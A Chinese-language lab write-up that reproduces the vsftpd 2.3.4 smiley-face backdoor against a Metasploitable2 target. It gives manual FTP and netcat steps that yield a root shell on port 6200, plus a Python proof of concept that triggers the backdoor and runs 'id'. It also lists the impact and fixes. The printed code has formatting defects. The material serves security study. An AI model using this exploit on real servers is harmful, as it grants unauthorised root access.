vsftpd 笑脸漏洞检测PoC（Python）实验

vsftpd 笑脸漏洞检测PoC（Python）实验

一、漏洞简介

vsftpd（Very Secure FTP Daemon） 是 Linux 系统中非常常用、轻量且高性能的 FTP 文件传输服务程序。

其中 2.3.4 版本并非代码漏洞，而是人为恶意植入后门：
只要攻击者在 FTP 登录时，用户名包含笑脸字符 :)，程序会自动在靶机 6200 端口开启一个无密码 Root 最高权限 Shell，攻击者可直接完全控制服务器。

二、实验环境

• 攻击机：Kali Linux

• 靶机环境：Metasploitable2

• 靶机 IP：192.168.17.132

三、漏洞原理

vsftpd 2.3.4 内置恶意后门逻辑：

  1. 接收 FTP 用户名字符串

  2. 匹配到特殊字符 :) 笑脸符号

  3. 后台自动监听 6200 端口

  4. 对外提供无需认证的 root 权限 Shell

因此攻击者可以不用密码、不用复杂利用，直接拿下服务器最高权限。

四、手动漏洞复现过程

  1. 靶机开机登录 msfadmin / msfadmin，通过 ifconfig 获取靶机 IP

  2. Kali 终端连接靶机 FTP 服务：
    ftp 192.168.17.132

  3. 用户名输入 test:)，密码任意填写

  4. 终端卡住即为 后门触发成功

  5. 新开终端使用 nc 连接后门端口：
    nc 192.168.17.132 6200

  6. 输入权限验证命令：
    id
    成功返回 uid=0(root)，说明已获取服务器最高权限，漏洞复现成功。

    五、Python PoC 脚本编写与自动化测试过程

为避免手动 FTP 卡死、操作繁琐，本次实验自主编写 Python PoC 自动化检测脚本，实现一键检测目标是否存在 vsftpd 笑脸后门。

1.PoC 源码
import socket
from ftplib import FTP

def check_vsftpd_smile_vuln(target_ip, ftp_port=21, backdoor_port=6200):
try:
# 触发后门
ftp = FTP()
ftp.connect(target_ip, ftp_port, timeout=3)
ftp.login(“test:)”, “123456”)
ftp.quit()
except Exception:
pass

try:
    # 连接后门端口验证权限
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((target_ip, backdoor_port))
    s.send(b"id\n")
    res = s.recv(512).decode("utf-8", errors="ignore")
    print("✅ 目标存在 vsftpd 2.3.4 笑脸后门！")
    print("权限回显：", res)
    s.close()
except Exception:
    print("❌ 目标无该漏洞")

if name == “main“:
ip = input(“请输入靶机IP：”)
check_vsftpd_smile_vuln(ip)
2.脚本测试完整过程

  1. 在 Kali 终端使用 nano 创建脚本文件：
    nano smile_poc.py

  2. 将完整 Python 代码粘贴进文件

  3. Ctrl+O 保存、Ctrl+X 退出编辑器

  4. 执行脚本：
    python3 smile_poc.py

  5. 输入靶机 IP：192.168.17.132

脚本自动完成：

• 连接 FTP 21端口

• 携带笑脸用户名触发后门

• 自动连接 6200 后门端口

• 自动读取系统权限信息、判断漏洞是否存在

实现 一键自动化漏洞检测，替代人工繁琐操作。

六、漏洞危害

  1. 无需账号密码即可获取服务器 Root 最高权限

  2. 可任意读取、篡改、删除服务器全部文件数据

  3. 可植入木马、持久控制服务器

  4. 一旦公网开放 21 端口，服务器极易被批量沦陷

七、修复方案

  1. 立即卸载 vsftpd 2.3.4，升级至最新安全版本

  2. 防火墙限制 21 端口访问，禁止对公网暴露

  3. 上线前对所有服务版本进行漏洞筛查

  4. 禁止使用存在已知后门、高危漏洞的老旧组件

八、实验总结

本次实验首先完成 手动 FTP+NC 漏洞复现，直观理解笑脸后门触发机制；再通过 自主编写 Python PoC 实现自动化检测，规避了手动操作卡死、步骤繁琐的问题。

本次实验让我理解到：vsftpd 笑脸漏洞属于人为植入后门，并非普通程序 Bug，危害性极高。同时掌握了简单 Socket 漏洞检测脚本的编写思路，提升了自动化渗透与漏洞验证能力。
